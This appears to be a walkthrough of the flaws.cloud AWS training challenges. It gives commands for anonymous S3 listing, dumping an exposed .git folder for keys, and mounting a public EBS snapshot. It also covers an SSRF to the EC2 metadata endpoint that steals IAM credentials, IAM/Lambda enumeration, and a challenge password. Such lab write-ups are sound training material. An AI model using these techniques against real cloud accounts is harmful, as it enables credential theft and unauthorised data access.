Title: flaws.cloud Challenges
Slug: cloud/aws/flaws.cloud
Date: 2025-03-18 00:00
Category: Cloud


## Level 1

Location: [http://flaws.cloud/](http://flaws.cloud/)

Check that the site is hosted on AWS:

~~~shell
dig flaws.cloud +short
~~~

![[dig-flaws-cloud.png]]

Confirm that flaws.cloud is a S3 bucket and get it's region by:

~~~shell
nslookup 52.92.148.3
~~~

![[nslookup-flaws-cloud-ip.png]]

List bucket content with:

~~~shell
aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
~~~

![[level1-ls-bucket.png]]

Level 1 completed:

![[level1-secret-page.png]]


## Level 2

Location: [http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/](http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/)

Level 2 is similar to level 1 but requires to be authenticated to AWS; set credentials with:

~~~shell
aws configure
~~~

List bucket content with:

~~~shell
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --region us-west-2
~~~

![[level2-ls-bucket.png]]

Level 2 completed:

![[level2-secret-page.png]]

## Level 3

Location: [http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/)

List bucket content with:

![[level3-ls-bucket.png]]

The `.git` folder content can be dumped using `git-dumper`:

~~~shell
git-dumper http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/ ./
~~~

![[level3-dump-git.png]]

Check git history:

~~~shell
git log
~~~

![[level3-git-history.png]]

Check old commits with :

~~~shell
git diff f52ec03b227ea6094b04e43f475fb0126edb5a61
~~~

![[level3-git-diff.png]]

Save found keys in `~/.aws/configuration` as new named profile:

![[level3-named-profile.png]]

List all buckets accessible by the configured profile:

~~~shell
aws s3 ls --region us-west-2 --profile flaws.cloud
~~~

![[level3-list-all-buckets.png]]

Complete Level 3 navigating to: `http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud`

## Level 4

Location: [http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud](http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud)

This level goal is to access the web page running on [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/)

![[level4-goal.png]]

This web page asks for a basic authentication:

![[level4-basic-auth.png]]

Using previous level credentials, it's not possible to list any content on the bucket but it's possible to list existing snapshots (filtering by "Tags not null" in order to filter out automatic snapshots): 

~~~shell
aws ec2 describe-snapshots --query 'Snapshots[?Tags!=null]' --profile flaws.cloud --region us-west-2
~~~

![[level4-enum-snapshots.png]]

Having the snapshot id, it's possible to create a volume from this snapshot **on the attacker** EC2 service on the same region:

~~~shell
aws ec2 create-volume --availability-zone us-west-2a --snapshot-id snap-0b49342abd1bdcb89 --region us-west-2
~~~

![[level4-create-volume.png]]

Check that the volume has been created on the console:

![[level4-created-volume.png]]

Create a snapshot from the created volume:

![[level4-create-snapshot.png]]

Create a new instance adding a second storage volume and specifying the previously created snapshot:

![[level4-create-instance.png]]

After launching it, connect to the instance (via SSH or from the console) and mount the disk as follows:

~~~shell
sudo mkdir /media/level4
lsblk
sudo mount /dev/xvdb1 /media/level4/
ls -l
~~~

![[level4-mount-volume.png]]

Following the nginx configuration:

![[level4-nginx-configuration.png]]

Generally, it could be worth trying cracking those hashes but this it's not the case.

After some more enumeration, a cleartext password it's found:

![[level4-credentials-leak.png]]

Password is: `nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M`.

Using found credentials, it's possible to login to the web page:

![[level4-win.png]]

Note that, having the whole volume mounted, it was enough to simple access the web page html file located at `/media/level4/var/www/html/index.html`.


## Level 5

From level 4 dumped nginx configuration file:

![[level5-nginx-proxy.png]]

It seems that an HTTP proxy function is configured at:

~~~
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/<destination http host>
~~~

This function allows an attacker to perform SSRF and interact with the EC2 instance metadata:

~~~
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data
~~~

![[level5-ssrf-metadata.png]]

Discover `flaws` user API keys:

~~~
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
~~~

![[level5-ssrf-metadata-credentials.png]]

Set found API keys in `~/.aws/credentials`.

![[level5-credentials.png]]

**Note that also the session token has been set.**

Use found API keys to list level6 bucket content:

~~~shell
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile level5.flaws.cloud --region us-west-2 --recursive
~~~


![[level5-list-bucket-level6.png]]

![[level5-win.png]]

## Level 6

Level 6 provides a set of credentials.

Get current profile identity info:

~~~shell
aws sts get-caller-identity --profile level6.flaws.cloud --region us-west-2
~~~

![[level6-sts-identity.png]]

Get same information with another command:

~~~shel
aws iam get-user --profile level6.flaws.cloud --region us-west-2
~~~

![[level6-iam-user.png]]

List policies attached to Level6:

~~~shell
aws iam list-attached-user-policies --user-name level6 --profile level6.flaws.cloud --region us-west-2
~~~

![[level6-user-policies.png]]

Get `list_apigateways` available versions:

~~~shell
aws iam list-policy-versions --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6.flaws.cloud --region us-west-2
~~~

![[level6-listapigateways-versions.png]]

Get permissions associated to `list_apigateways` - `v4` policy:

~~~shell
aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4 --profile level6.flaws.cloud --region us-west-2
~~~

![[level6-listapigateways-permission.png]]

Note that the user can perform some get operations on specific apigateway module's rest API  but cannot list every existing API so an API id is required in order to continue.

List `MySecurityAudit` versions:

~~~shell
aws iam list-policy-versions --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit --profile level6.flaws.cloud --region us-west-2
~~~

![[level6-mysecurityaudit-versions.png]]

Get `MySecurityAudit` - `v1` capabilities:

~~~shell
aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit --version-id v1 --p
rofile level6.flaws.cloud --region us-west-2
~~~

![[level6-mysecurityaudit-permissions.png]]

`MySecurityAudit` has the `lambda:List*` permission which allows to list every existing lambda function:

~~~shell
aws lambda list-functions --profile level6.flaws.cloud --region us-west-2
~~~

![[level6-list-lambda-functions.png]]

Also, the `lambda:GetPolicy` allows to obtain information about policies associated to a lambda function:

~~~shell
aws lambda get-policy --function-name Level6 --profile level6.flaws.cloud --region us-west-2
~~~

![[level6-lambda-level6-policy.png]]

Function `Level6` has some permissions on the resource `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6` which appears to be a rest API object. From this ARN it's possible to extract the resource id which is `s33ppypa75`.

Using this id, get the rest API name which is `Level6`:

~~~shell
aws apigateway get-rest-api --rest-api-id s33ppypa75 --profile level6.flaws.cloud --region us-west-2
~~~

![[level6-get-api.png]]

List available stages for function `Level6`:

~~~shell
aws apigateway get-stages --rest-api-id s33ppypa75 --profile level6.flaws.cloud --region us-west-2
~~~

![[level6-get-api-stages.png]]

Invoke the API:

~~~shell
curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
~~~

![[level6-curl-api.png]]

Win:

![[level6-win.png]]